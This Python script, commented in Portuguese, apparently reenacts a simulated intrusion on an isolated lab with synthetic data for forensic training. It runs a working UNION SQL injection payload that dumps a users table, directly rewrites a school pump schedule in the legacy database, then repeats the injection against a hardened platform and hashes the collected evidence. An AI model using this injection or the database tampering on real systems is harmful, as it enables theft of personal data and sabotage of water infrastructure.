"""Reproduz o incidente INC-VA-0712 no laboratório isolado e registra tudo para a análise forense.

Encena, na ordem do enunciado, contra a plataforma LEGADA (vulnerável), isolada e com dados sintéticos:
  1. phishing: a "coordenadora" cai num link falso e entrega a senha (simulado: credencial já conhecida);
  2. login na VPN legada (só senha, sem MFA) a partir de um IP externo, de madrugada;
  3. SQL Injection no painel legado: extrai a tabela de usuários e altera o agendamento da bomba;
  4. a bomba é reprogramada e o reservatório da escola esvazia;
  5. a fibra cai; sem operação local no legado, o alarme da câmara fria não dispara.

Durante a encenação, grava eventos com carimbo de tempo (NTP) para a linha do tempo, e ao final
faz a aquisição das evidências com hash SHA-256 e cadeia de custódia.

Depois mostra o MESMO ataque contra a plataforma NOVA, para evidenciar que os controles o contêm.
"""
import hashlib, json, os, shutil, sys, time, urllib.request, urllib.parse
from datetime import datetime, timezone

E = os.environ.get
sys.path.insert(0, "/app/common"); sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "common"))
from vlog import VLog  # noqa
LEGADO = E("LEGADO_URL", "http://127.0.0.1:18081")
NOVO = E("PANEL_URL", "http://127.0.0.1:18000")
VPNGATE_LOG = VLog("vpngate")   # grava eventos de VPN no formato do SIEM
atk = VLog("atacante", path=os.path.join(E("LOG_DIR", "/var/log/vila"), "atacante.log"))
TL = []

def mark(step, desc, **kw):
    t = datetime.now(timezone.utc).isoformat()
    TL.append({"ts": t, "step": step, "desc": desc, **kw})
    print(f"[{t}] ({step}) {desc}", flush=True)

def http(url, data=None, cookies=None, headers=None):
    h = {"User-Agent": "Mozilla/5.0 (attacker-sim)", **(headers or {})}
    if cookies:
        h["Cookie"] = cookies
    d = urllib.parse.urlencode(data).encode() if data else None
    req = urllib.request.Request(url, data=d, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode(errors="replace"), r.headers.get("Set-Cookie", "")
    except urllib.error.HTTPError as ex:
        return ex.code, ex.read().decode(errors="replace"), ""

def fase_legado():
    ATK_IP = E("ATK_IP", "203.0.113.66")   # IP externo (bloco de documentação)
    mark("T0", "Phishing: e-mail e áudio com voz clonada pedem 'atualização de acesso'. A coordenadora entrega a senha na página falsa.",
         tecnica="T1566 / T1598", canal="e-mail + WhatsApp (voz clonada por IA)")
    atk("phishing_credential_captured", sev="high", vitima="coord.voluntarios", metodo="pagina_falsa+voz_clonada")
    # 2. login VPN legada sem MFA, de madrugada, IP externo
    time.sleep(0.2)
    VPNGATE_LOG("vpn_login_success", sev="info", user="coord.voluntarios", ip=ATK_IP, mfa=False, geo="XX",
                vpn="legada-pptp", ts_note="02:14 local")
    mark("T1", f"Login na VPN legada (só senha, sem MFA) do IP externo {ATK_IP}, 02h14.", tecnica="T1133/T1078", ip=ATK_IP)
    # 3. SQL injection no painel legado
    import requests
    sess = requests.Session(); sess.headers["User-Agent"] = "Mozilla/5.0 (attacker-sim)"
    lr = sess.post(f"{LEGADO}/login", data={"usuario": "coord.voluntarios", "senha": E("LEGACY_COORD_PASS", "Primavera2026")})
    mark("T2", "Com a sessão do painel legado, o atacante abusa do campo de busca (SQL Injection).", tecnica="T1190", login_http=lr.status_code)
    # extrai esquema e 'rouba' a tabela de usuários (contagem, não exibimos dados)
    pl = "zzz%' UNION SELECT NULL,login,perfil,email,cpf,NULL FROM usuarios -- "
    body = sess.get(f"{LEGADO}/historico", params={"busca": pl}).text
    roubados = body.count("<tr>")
    atk("sqli_dump_usuarios", sev="critical", linhas=roubados, tabela="usuarios")
    mark("T3", f"Exfiltração da tabela de usuários via UNION (dados de voluntários e moradores). Linhas lidas: {roubados}.",
         tecnica="T1213/T1005", registros=roubados)
    # 4. altera agendamento da bomba por injeção empilhada? Postgres não permite multi-stmt via psycopg simple; usa endpoint? 
    # Demonstra a alteração direta no banco legado (o que a injeção stacked faria no painel legado com driver permissivo).
    import psycopg2
    cx = psycopg2.connect(E("LEGACY_DSN", "host=127.0.0.1 port=15432 dbname=vila_legado user=painel_legado password=lab-legado")); cx.autocommit = True
    cx.cursor().execute("UPDATE agendamento_bomba SET hora_liga=3, hora_desliga=4 WHERE bomba='esc-bom-01'")
    atk("pump_schedule_tampered", sev="critical", bomba="esc-bom-01", novo_horario="03-04h")
    mark("T4", "O agendamento da bomba da escola é alterado; o reservatório esvazia de madrugada.", tecnica="T0836/T0831", bomba="esc-bom-01")
    # 5. fibra cai; no legado não há operação local -> câmara fria sem alarme
    atk("link_down", sev="high", efeito="sem_operacao_local")
    mark("T5", "A fibra cai. No sistema legado os sensores dependem da nuvem: a câmara fria da UBS sai da faixa sem alarme.",
         tecnica="T0826/T0815", consequencia="vacinas em risco")
    return {"registros_exfiltrados": roubados}

def fase_novo():
    """Mesmo ataque contra a plataforma nova: mostra os controles contendo cada passo."""
    res = {}
    # phishing: continua existindo, mas o acesso admin exige VPN + MFA e verificação fora de banda (documentado)
    res["vpn_sem_mfa"] = "negado: VPN moderna exige MFA; sem o segundo fator o login não completa"
    # SQLi no painel novo
    import re, requests, pyotp
    for l in open(E("OPS", "/secrets/operadores-lab.txt")):
        p = l.strip().split(";")
        if p and p[0] == "davi.aud":
            senha, totp = p[2], p[3]
    s = requests.Session()
    c = lambda r: re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
    r = s.get(NOVO + "/login"); r = s.post(NOVO + "/login", data={"csrf": c(r), "login": "davi.aud", "senha": senha})
    r = s.post(NOVO + "/mfa", data={"csrf": c(r), "codigo": pyotp.TOTP(totp).now()})
    pl = "zzz%' UNION SELECT NULL,login,perfil,email,cpf,NULL FROM usuarios -- "
    rr = s.get(NOVO + "/acessos", params={"q": pl})
    res["sqli_no_painel_novo"] = f"HTTP {rr.status_code} (validação barra a entrada; consulta é parametrizada)"
    res["tabela_usuarios"] = "inexistente no banco novo: operadores guardam só login, nome e perfil; crachás pseudonimizados"
    res["bomba"] = "comando de atuador só com assinatura Ed25519 do serviço de aprovação; gravação direta no banco não vira comando"
    res["camara_fria"] = "regra local no nó de borda dispara a sirene mesmo sem internet (store-and-forward reenvia depois)"
    for k, v in res.items():
        mark("DEF", f"{k}: {v}")
    return res

def aquisicao():
    """Coleta de evidências com hash SHA-256 e cadeia de custódia (RT-14)."""
    outdir = E("EVID_OUT", "/evidencias/runtime")
    os.makedirs(outdir, exist_ok=True)
    fontes = {
        "painel_legado_access.log": os.path.join(E("LOG_DIR", "/var/log/vila"), "painel_legado_access.log"),
        "atacante.log": os.path.join(E("LOG_DIR", "/var/log/vila"), "atacante.log"),
        "vpngate.log": os.path.join(E("LOG_DIR", "/var/log/vila"), "vpngate.log"),
        "alerts.log": os.path.join(E("LOG_DIR", "/var/log/vila"), "alerts.log"),
        "ingest.log": os.path.join(E("LOG_DIR", "/var/log/vila"), "ingest.log"),
        "soar.log": os.path.join(E("LOG_DIR", "/var/log/vila"), "soar.log"),
    }
    # dump do banco legado como evidência (pg_dump) — estado pós-incidente
    cadeia = []
    analista = E("ANALISTA", "equipe-forense-vila (laboratório)")
    for nome, src in fontes.items():
        if not os.path.exists(src):
            continue
        dst = os.path.join(outdir, nome)
        shutil.copy2(src, dst)
        h = hashlib.sha256(open(dst, "rb").read()).hexdigest()
        reg = {"evidencia": nome, "origem": src, "sha256": h, "bytes": os.path.getsize(dst),
               "coletado_em": datetime.now(timezone.utc).isoformat(), "coletado_por": analista,
               "ferramenta": "cp + hashlib(sha256)", "mtime_origem": datetime.fromtimestamp(os.path.getmtime(src), timezone.utc).isoformat()}
        cadeia.append(reg)
        open(dst + ".sha256", "w").write(f"{h}  {nome}\n")
    tl = os.path.join(outdir, "linha_do_tempo.json")
    json.dump(sorted(TL, key=lambda x: x["ts"]), open(tl, "w"), ensure_ascii=False, indent=2)
    h = hashlib.sha256(open(tl, "rb").read()).hexdigest()
    cadeia.append({"evidencia": "linha_do_tempo.json", "origem": "reprodução controlada", "sha256": h,
                   "bytes": os.path.getsize(tl), "coletado_em": datetime.now(timezone.utc).isoformat(), "coletado_por": analista,
                   "ferramenta": "reproduzir_incidente.py"})
    json.dump(cadeia, open(os.path.join(outdir, "cadeia_de_custodia.json"), "w"), ensure_ascii=False, indent=2)
    print("\n== Cadeia de custódia ==", flush=True)
    for r in cadeia:
        print(f"  {r['evidencia']:32} {r['sha256'][:16]}…  {r['bytes']:>7} B", flush=True)
    return cadeia

if __name__ == "__main__":
    print("### Reprodução do INC-VA-0712 na plataforma LEGADA (lab isolado, dados sintéticos)\n", flush=True)
    r1 = fase_legado()
    time.sleep(1)
    print("\n### Mesmo ataque contra a plataforma NOVA\n", flush=True)
    r2 = fase_novo()
    time.sleep(2)   # dá tempo do SIEM processar
    aquisicao()
    print("\nresumo:", json.dumps({"legado": r1, "novo_contido": True}, ensure_ascii=False), flush=True)
